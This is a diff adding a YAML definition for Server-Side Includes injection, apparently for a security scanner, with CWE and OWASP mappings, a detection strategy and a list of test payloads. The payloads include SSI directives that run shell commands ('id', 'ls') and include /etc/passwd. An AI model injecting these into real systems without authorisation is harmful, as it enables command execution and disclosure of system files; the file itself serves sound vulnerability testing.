@@ -1,0 +1,21 @@
+id: SSI
+name: Server-Side Includes Injection
+cwe:
+- CWE-97
+owasp: A03:2021 Injection
+severity_range: High
+description: Application processes SSI directives in user input, allowing command execution or file inclusion.
+detection:
+  payloads:
+  - <!--#exec cmd="id" -->
+  - <!--#exec cmd="ls" -->
+  - <!--#include virtual="/etc/passwd" -->
+  - <!--#echo var="DOCUMENT_ROOT" -->
+  - <!--#printenv -->
+  strategy:
+  - 1. Check if the server processes .shtml files
+  - 2. Inject SSI directives in all input fields
+  - 3. Check if the response contains command output
+evidence_needed: Command output or file content from SSI directive in response
+references:
+- https://owasp.org/www-community/attacks/Server-Side_Includes_(SSI)_Injection
